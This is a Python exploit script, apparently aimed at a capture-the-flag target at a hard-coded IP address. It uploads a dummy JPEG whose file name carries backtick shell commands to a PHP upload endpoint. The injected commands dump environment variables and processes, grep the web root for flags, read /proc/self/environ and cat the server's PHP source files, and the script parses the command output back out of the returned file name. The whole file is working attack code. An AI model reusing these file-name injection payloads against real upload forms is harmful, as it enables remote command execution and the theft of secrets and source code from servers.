import requests
import re
from urllib.parse import unquote

# Create minimal valid JPEG
jpeg_header = bytes([
    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x43,
    0x00, 0x03, 0x02, 0x02, 0x02, 0x02, 0x02, 0x03, 0x02, 0x02, 0x02, 0x03,
    0x03, 0x03, 0x03, 0x04, 0x06, 0x04, 0x04, 0x04, 0x04, 0x04, 0x08, 0x06,
    0x06, 0x05, 0x06, 0x09, 0x08, 0x0A, 0x0A, 0x09, 0x08, 0x09, 0x09, 0x0A,
    0x0C, 0x0F, 0x0C, 0x0A, 0x0B, 0x0E, 0x0B, 0x09, 0x09, 0x0D, 0x11, 0x0D,
    0x0E, 0x0F, 0x10, 0x10, 0x11, 0x10, 0x0A, 0x0C, 0x12, 0x13, 0x12, 0x10,
    0x13, 0x0F, 0x10, 0x10, 0x10, 0xFF, 0xC9, 0x00, 0x0B, 0x08, 0x00, 0x01,
    0x00, 0x01, 0x01, 0x01, 0x11, 0x00, 0xFF, 0xCC, 0x00, 0x06, 0x00, 0x10,
    0x10, 0x05, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00,
    0xD2, 0xCF, 0x20, 0xFF, 0xD9
])

with open('dummy.jpg', 'wb') as f:
    f.write(jpeg_header)

url = "http://142.93.145.89:10004/upload.php"

# Try different approaches to find the flag
payloads = [
    'a`env`b.jpeg',                                   # Check environment variables
    'a`ps aux`b.jpeg',                                 # Check processes
    'a`find / -name "*.php" -exec grep -l "flag" {} \; 2>/dev/null | head -1`b.jpeg',
    'a`grep -r "flag" /var/www/html 2>/dev/null | head -1`b.jpeg',
    'a`php -r "print_r(get_defined_vars());"`b.jpeg',  # PHP variables
    'a`cat /proc/self/environ | tr "\0" "\n"`b.jpeg', # Process environment
]

for payload in payloads:
    print(f"\n[*] Trying: {payload}")
    try:
        with open('dummy.jpg', 'rb') as f:
            files = {'file': (payload, f, 'image/jpeg')}
            response = requests.post(url, files=files, timeout=10)
        
        if response.status_code == 200:
            match = re.search(r'/uploads/[^/]+/([^"]+\.jpg)', response.text)
            if match:
                filename = unquote(match.group(1))
                print(f"[+] Result filename: {filename}")
                
                # Extract output
                if filename.startswith('a') and filename.endswith('b.jpeg'):
                    output = filename[1:-6]
                    if output and output != payload[1:-6].replace(' ', '%20'):
                        print(f"[+] Command output: {output}")
                        
                        # Check if it looks like a flag
                        if any(x in output for x in ['flag', '{', '}', 'FLAG']):
                            print(f"\n[!!!] POSSIBLE FLAG FOUND: {output}")
                            break
            elif "Rate limit exceeded" in response.text:
                print("[-] Rate limited")
                break
    except Exception as e:
        print(f"[-] Error: {e}")

source_payloads = [
    'a`cat /var/www/html/upload.php`b.jpeg',
    'a`cat /var/www/html/index.php`b.jpeg',
    'a`ls -la /var/www/html/`b.jpeg',
]